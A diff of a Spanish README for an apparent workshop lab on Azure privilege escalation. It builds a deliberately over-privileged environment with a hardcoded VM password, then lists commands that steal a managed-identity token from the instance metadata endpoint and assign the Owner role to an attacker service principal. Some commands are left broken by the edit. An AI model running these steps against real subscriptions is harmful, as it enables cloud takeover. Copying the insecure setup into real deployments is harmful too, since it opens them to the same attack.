@@ -1,54 +1,58 @@
 # Escalada-de-Privilegios-en-Azure
 
-##Fase 1: Configuración del Entorno Vulnerable
+## Fase 1: Configuración del Entorno Vulnerable
 
-###Paso 1: Crear un Grupo de Recursos
+### Paso 1: Crear un Grupo de Recursos
 
 Este grupo de recursos contendrá todos los elementos del laboratorio.
 
-az group create --name <NombreDelGrupoDeRecursos> --location eastus
+az group create --name lab-escalation --location eastus
 
-###Paso 2: Crear una Identidad Administrada Asignada por el Usuario
+### Paso 2: Crear una Identidad Administrada Asignada por el Usuario
 
 Esta identidad tendrá permisos elevados que serán explotados más adelante.
 
-az identity create --name <NombreDeLaIdentidad> --resource-group <NombreDelGrupoDeRecursos>
+az identity create --name labidentity --resource-group lab-escalation
 
-###Paso 3: Introducir la Vulnerabilidad Principal
+### Paso 3: Introducir la Vulnerabilidad Principal
 
 Asignamos el rol de User Access Administrator a la identidad sobre toda la suscripción. Este es un privilegio excesivo y el núcleo de la vulnerabilidad, ya que este rol permite gestionar los permisos de otros usuarios.
 
- Obtener el ID de la suscripción
+Obtener el ID de la suscripción
 subscriptionId=$(az account show --query id --output tsv)
 
- Obtener el ID de la entidad de servicio de la identidad administrada
-principalId=$(az identity show --name <NombreDeLaIdentidad> --resource-group <NombreDelGrupoDeRecursos> --query principalId --output tsv)
+Obtener el ID de la entidad de servicio de la identidad administrada
+identityPrincipalId=$(az identity show --name "labidentity" --resource-group "lab-escalation" --query principalId --output tsv)
 
  Asignar el rol de "User Access Administrator" a la identidad administrada sobre toda la suscripción
  ESTE ES EL CAMBIO CLAVE
-az role assignment create --assignee $principalId --role "User Access Administrator" --scope "/subscriptions/$subscriptionId"
+az role assignment create \
+    --assignee $identityPrincipalId \
+    --role "User Access Administrator" \
+    --scope "/subscriptions/$subscriptionId"
 
-###Paso 4: Crear una Máquina Virtual y Asignarle la Identidad Administrada
+
+### Paso 4: Crear una Máquina Virtual y Asignarle la Identidad Administrada
 
 Esta VM será el punto de entrada para los participantes.
 
 az vm create \
-    --resource-group <NombreDelGrupoDeRecursos> \
-    --name <NombreDeLaVM> \
-    --image Ubuntu2204 \
-    --admin-username <UsuarioAdmin> \
-    --admin-password "<ContraseñaSegura>" \
-    --assign-identity <NombreDeLaIdentidad>
+    --resource-group "lab-escalation" \
+    --name "compromised-vm" \
+    --image "Ubuntu2204" \
+    --admin-username "franklin" \
+    --admin-password "Franklin.123456" \
+    --assign-identity "labidentity"
 
-###Paso 5: Crear un Usuario con Permisos Limitados
+### Paso 5: Crear un Usuario con Permisos Limitados
 
-Creamos un Service Principal con permisos para ejecutar comandos en la VM. Este será el punto de partida para los participantes del workshop. El rol Virtual Machine Contributor es necesario para permitir la ejecución de run-command.
+Creamos un Service Principal con permisos para ejecutar comandos en la VM. El rol Virtual Machine Contributor es necesario para permitir la ejecución de run-command.
 
 Obtener el ID de la VM
-vmId=$(az vm show --resource-group "<namerg>" --name "<name-vm>" --query id --output tsv)
+vmId=$(az vm show --resource-group "lab-escalation" --name "compromised-vm" --query id --output tsv))
 
 Crear el Service Principal con permisos sobre la VM
-sp_credentials=$(az ad sp create-for-rbac --name "attacker-sp" --role "Virtual Machine Contributor" --scopes $vmId)"
+sp_credentials=$(az ad sp create-for-rbac --name "attacker-sp" --role "Virtual Machine Contributor" --scopes $vmId)
 
 Mostrar las credenciales que se entregarán a los participantes
 
@@ -56,41 +60,29 @@ echo "--- Credenciales para los Participantes del Workshop ---"
 echo $sp_credentials
 echo "--------------------------------------------------------"
 
-Acción: Copia  (appId, password, tenant) generadas
+Acción: Copiar  (appId, password, tenant) generadas
 
 
 ¡Importante! Guarde y proporcione a los participantes del workshop el App ID, Password y Tenant ID generados en el último paso.
 
-##Fase 2: Ejecución de la Escalada de Privilegios 
+## Fase 2: Ejecución de la Escalada de Privilegios 
 
-###2.1. Obtener Acceso Inicial y Verificar Control
+### 2.1. Obtener Acceso Inicial y Verificar Control
 Iniciar sesión con las credenciales de atacante y confirmar que se pueden ejecutar comandos en la VM.
 
 1. Iniciar sesión con las credenciales proporcionadas
+   
 az login --service-principal \
     -u "EL_APPID_PROPORCIONADO" \
     -p "EL_PASSWORD_PROPORCIONADO" \
     --tenant "EL_TENANT_ID_PROPORCIONADO"
 
-2. Ejecutar un comando simple en la VM para verificar el control
-az vm run-command invoke \
-    --resource-group "<namerg>" \
-    --name "<name-vm>" \
-    --command-id "RunShellScript" \
-    --scripts "ls -l /"
 
-Esto confirma que tienen control sobre la VM.
-
-###2.2. Descubrimiento de la Identidad Administrada
+### 2. Descubrimiento de la Identidad Administrada
 Dentro de la VM (simulado a través de run-command), el siguiente paso es descubrir la identidad administrada.
 
-Obtener un token de acceso para la identidad administrada
- Este script completo se ejecuta dentro de la VM para obtener el token y listar recursos
-az vm run-command invoke \
-    --resource-group "lab-escalation-rg" \
-    --name "compromised-vm" \
-    --command-id "RunShellScript" \
-    --scripts '
+Este script completo se ejecuta dentro de la VM para obtener el token y listar recursos
+
    1. Instalar silenciosamente jq, una herramienta necesaria para parsear JSON
       sudo apt-get update > /dev/null 2>&1 && sudo apt-get install -y jq > /dev/null 2>&1
 
@@ -98,31 +90,39 @@ az vm run-command invoke \
         token=$(curl -s "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" -H Metadata:true | jq -r .access_token)
         
       3. Usar el token para realizar una llamada a la API de Azure y listar recursos
-        curl -s -X GET -H "Authorization: Bearer $token" "https://management.azure.com/subscriptions/$(az account show --query id -o tsv)/resourceGroups/<namerg>/resources?api-version=2021-04-01"
-    '
+       curl -s -X GET -H "Authorization: Bearer $token" "https://management.azure.com/subscriptions/$(az account show --query id -o tsv)/resourceGroups/lab-escalation-rg/resources?api-version=2021-04-01"
 
-Resultado Esperado: Una salida JSON con la lista de todos los recursos del grupo lab-escalation-rg. Esto prueba que el atacante ahora opera con los permisos de la identidad (User Access Administrator).
+Resultado Esperado: Una salida JSON con la lista de todos los recursos del grupo lab-escalation. Esto prueba que el atacante ahora opera con los permisos de la identidad (User Access Administrator).
 
-###Paso 2.3: Escalada Final a Propietario (Owner)
+### Paso 2.1: Escalada Final a Propietario (Owner)
 Utilizar el poder adquirido para tomar control total.
 A. (En la máquina local) Obtener el Object ID del Service Principal atacante
+
 user_object_id=$(az ad sp list --display-name "attacker-sp" --query "[0].id" -o tsv)
 echo "El Object ID del atacante es: $user_object_id"
 
+
 B. (Ejecutado en la VM) Usar la identidad para asignar el rol de Owner al atacante
   Reemplaza <Tu_Object_ID> y <ID_de_tu_Suscripcion> con tus valores.
-az vm run-command invoke \
-    --resource-group "lab-escalation-rg" \
-    --name "compromised-vm" \
-    --command-id "RunShellScript" \
-    --scripts '
-       Iniciar sesión dentro de la VM usando su propia identidad
-        az login --identity > /dev/null 2>&1
+  
+  az login --identity > /dev/null 2>&1
 
   Asignar el rol de Propietario al Object ID del atacante
  az role assignment create --assignee "<Tu_Object_ID>" --role "Owner" --scope "/subscriptions/<ID_de_tu_Suscripcion>"
     '
 Resultado Esperado: Una salida JSON que confirma la creación de la nueva asignación de rol.
+
+para deslogearte de la identidad administrada ejecuta el siguiente script
+
+az logout
+
+e inicia sesion con el owner que es el service principal
+
+az login --service-principal \
+    -u "<APP_ID>" \
+    -p "<PASSWORD>" \
+    --tenant "<TENANT_ID>"
+
 
 (En la máquina local) El atacante, ahora Owner, crea un nuevo grupo de recursos
 az group create --name "prueba-de-control-total" --location "westus"
